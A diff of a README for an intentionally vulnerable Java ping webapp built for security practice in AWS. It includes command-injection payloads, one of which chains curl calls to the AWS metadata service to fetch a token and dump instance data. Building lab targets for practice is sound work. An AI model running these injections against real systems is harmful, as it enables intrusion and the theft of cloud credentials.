@@ -1,6 +1,7 @@
 # Vulnerable Java Webapp
 
 A simple java based webapp which contains a code injection vulnerability. 
+This is a vulnerable application for use in security testing and practice ONLY. Do not deploy anywhere in production!
  
 
 ## Table of Contents
@@ -8,23 +9,27 @@ A simple java based webapp which contains a code injection vulnerability.
 - [Features](#features)
 - [Installation](#installation)
 - [Usage](#usage)
-- [License](#license)
+- [Exploitation](#license)
+- [Vulnerability](#vulnerability)
 
 ## Features
 
-I needed a simple app for security testing in AWS, in Java.
+I needed a simple app for security testing in AWS, in Java!
 The premise is a simple "is it up" type app, which executes a ping in the background.
 
-- Simple stand alone application
+- Simple standalone application
 - Uses jetty for simple setup
 - Includes command injection vulnerability
 - Can be leverged to SSRF in an AWS environment, for example to gather data from the AWS metadata service
 - appspec and buildspec installedif you'd like to deploy using a code pipeline in AWS
+![Screenshot](screenshot.jpg)
+![Screenshot2](screenshot2.jpg)
+
 
 ## Installation
 
 Clone the repo and ensure you have maven installed.
-If deploying in aws I recommend deploying to an amazon linux instance (this is where I tested it), but Ubuntu should work too.
+If deploying in AWS I recommend deploying to an Amazon Linux instance (this is where I tested it), but Ubuntu should work too.
 
 
 ## Usage
@@ -37,14 +42,15 @@ Note that AWS requires some specific syntax to invoke long running commands as p
 
 ## Exploitation
 
+A couple of ways to exploit the app:
 
 **Code execution:**
-Example exploitation- 
+
 ```google.com && whoami```
 
 
 **SSRF exploit:**
-Example exploitation- 
+
 ```google.com && TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/ > output && cat output```
 
 
